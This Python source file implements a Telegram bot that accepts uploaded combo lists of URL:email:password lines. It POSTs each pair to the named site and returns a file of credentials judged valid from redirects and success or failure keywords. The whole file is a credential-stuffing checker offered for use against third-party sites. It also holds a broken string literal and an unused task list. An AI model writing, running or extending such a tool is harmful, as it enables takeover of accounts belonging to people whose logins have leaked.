import os
import re
import asyncio
import aiohttp
from flask import Flask, request
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
# These must be set in Render Environment Variables
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
ALLOWED_USER_ID = os.getenv("ALLOWED_USER_ID") # Your Telegram User ID for security

app = Flask(__name__)

# --- PARSING LOGIC ---
def parse_line(line):
    """
    Parses lines in formats like:
    https://site.com/login:email:password
    https://site.com:email:password
    site.com:email:password
    Returns (url, email, password) or None if invalid.
    """
    line = line.strip()
    if not line or line.startswith('#'):
        return None

    # We need to split by ':' but URLs contain ':' (http://).
    # Strategy: Find the last two colons. Everything after last colon is pass.
    # Everything between second-to-last and last is user. Everything before is URL.
    
    try:
        # Find indices of all colons
        colon_indices = [i for i, char in enumerate(line) if char == ':']
        
        if len(colon_indices) < 2:
            return None # Not enough parts for url:user:pass
            
        # The last two colons separate the password and username
        last_colon = colon_indices[-1]
        second_last_colon = colon_indices[-2]
        
        password = line[last_colon + 1:]
        username_email = line[second_last_colon + 1:last_colon]
        url_part = line[:second_last_colon]
        
        # Validate URL part (must start with http or be a domain)
        if not url_part.startswith('http'):
            url_part = 'https://' + url_part
            
        # Ensure we have a valid looking email or username
        if not username_email or not password:
            return None
            
        return (url_part, username_email, password)
        
    except Exception:
        return None

# --- CHECKING LOGIC ---
async def check_single_credential(session, url, user, password):
    """
    Attempts to verify credentials.
    Since we don't know the specific login endpoint for every site,
    we attempt a generic check:
    1. Try to access the URL. If it's a login page, it usually returns 200.
    2. We cannot reliably "login" without knowing the specific form parameters (csrf, specific field names).
    
    NOTE: For a generic checker on unknown sites, the most reliable method without custom scripts 
    is to check if the site is alive and if the credentials follow a valid format. 
    HOWEVER, to actually test validity, we need to attempt a login.
    
    SIMULATION FOR THIS BOT:
    Since generic login detection is unreliable without specific site configs, 
    this bot will attempt a POST request to the provided URL with the credentials.
    If the server responds with a redirect (302) or a success token, we mark it valid.
    If it returns an error page or stays on login, we mark invalid.
    
    WARNING: This may yield false negatives on sites with complex protections.
    """
    try:
        # We assume the URL provided IS the login endpoint.
        # We try to POST the credentials.
        payload = {
            "email": user,
            "username": user,
            "user": user,
            "password": password
        }
        
        # Try common login field names
        for key in ["email", "username", "user", "login"]:
            payload[key] = user
        
        async with session.post(url, data=payload, allow_redirects=False, timeout=10) as response:
            status = response.status
            
            # Heuristic: 
            # 302/301 often means login success (redirect to dashboard) OR failure (redirect to login with error).
            # 200 often means login failed (stay on page with error message) OR success (if no redirect).
            
            # We look for specific "Success" indicators in the response
            text = await response.text()
            lower_text = text.lower()
            
            # Indicators of FAILURE
            fail_terms = ["invalid", "incorrect", "failed", "error", "wrong", "unauthorized", "forbidden"]
            # Indicators of SUCCESS
            success_terms = ["welcome", "dashboard", "success", "token", "session", "logout", "account"]
            
            has_fail = any(term in lower_text for term in fail_terms)
            has_success = any(term in lower_text for term in success_terms)
            
            if status in [301, 302, 303]:
                # If it redirects, we assume it might be valid if it doesn't redirect back to login
                # But without knowing the login URL, we can't be 100% sure. 
                # However, many simple scripts consider a redirect on a login attempt as "Potential Valid".
                # To be safe and avoid false positives, we only count it if we don't see error terms.
                if not has_fail:
                    return True
                return False
            
            if has_success and not has_fail:
                return True
                
            return False

    except Exception:
        return False

async def process_file_task(chat_id, file_path, context):
    valid_results = []
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text="❌ Error reading file.")
        return

    total = len(lines)
    await context.bot.send_message(chat_id=chat_id, text=f"⚙️ Started processing {total} lines.\nThis may take time. I will send a file with valid credentials when done.")

    connector = aiohttp.TCPConnector(limit=50) # Limit concurrency
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for line in lines:
            parsed = parse_line(line)
            if parsed:
                url, user, passw = parsed
                tasks.append(check_single_credential(session, url, user, passw))
        
        # Process in batches to avoid overwhelming memory
        # Actually, let's do it sequentially or small batches to be safe on free tier
        count = 0
        for line in lines:
            parsed = parse_line(line)
            if parsed:
                url, user, passw = parsed
                is_valid = await check_single_credential(session, url, user, passw)
                if is_valid:
                    valid_results.append(f"{url}:{user}:{passw}")
            
            count += 1
            if count % 10 == 0:
                # Report progress
                await context.bot.send_message(chat_id=chat_id, text=f"⏳ Progress: {count}/{total} lines checked.")

    # Send results
    if valid_results:
        filename = "valid_credentials.txt"
        with open(filename, 'w') as f:
            f.write("\n".join(valid_results))
        
        await context.bot.send_document(
            chat_id=chat_id,
            document=open(filename, 'rb'),
            caption=f"✅ Found {len(valid_results)} valid credentials out of {total}."
        )
        os.remove(filename)
    else:
        await context.bot.send_message(chat_id=chat_id, text="🛑 No valid credentials found.")

    # Clean up input file
    if os.path.exists(file_path):
        os.remove(file_path)

# --- TELEGRAM HANDlers ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ALLOWED_USER_ID and str(update.message.from_user.id) != ALLOWED_USER_ID:
        return # Ignore unauthorized users
    await update.message.reply_text(
        "👨‍💻 **Credential Checker Bot**\n\n"
        "Send me a `.txt` file containing credentials in the format:\n"
        `URL:email:password` or `URL:username:password`\n\n"
        "I will check each line and return a new file with only the **valid** ones.\n\n"
        "⚠️ **Note:** This runs on a free server. Large files may take time or timeout."
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ALLOWED_USER_ID and str(update.message.from_user.id) != ALLOWED_USER_ID:
        return

    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file only.")
        return

    file = await context.bot.get_file(document.file_id)
    file_path = "input_credentials.txt"
    await file.download_to_drive(file_path)

    await update.message.reply_text("📥 File received. Starting validation process...")
    
    # Start processing in background
    asyncio.create_task(process_file_task(update.message.chat_id, file_path, context))

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Update {update} caused error {context.error}")

# --- MAIN EXECUTION ---
if __name__ == '__main__':
    if not TOKEN:
        print("ERROR: TELEGRAM_BOT_TOKEN not found. Please set environment variables.")
        exit(1)

    # Start Telegram Bot
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.TEXT, start_command)) # Treat text as start/help
    
    print("🚀 Bot is running...")
    # Run the bot polling
    application.run_polling(allowed_updates=Update.ALL_TYPES)
